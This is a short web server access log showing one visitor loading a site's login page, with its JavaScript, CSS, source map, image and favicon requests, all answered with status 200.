106.102.11.104 - - [27/Jun/2024:21:39:19 +0000] "GET /static/js/main.2dc7e812.js.map HTTP/1.1" 200 58129177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:43:54 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:43:55 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:43:56 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:43:55 +0000] "GET /static/js/main.2dc7e812.js HTTP/1.1" 200 38575987 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:44:08 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:44:10 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.104 - - [27/Jun/2024:21:44:08 +0000] "GET /static/js/main.2dc7e812.js.map HTTP/1.1" 200 58129177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
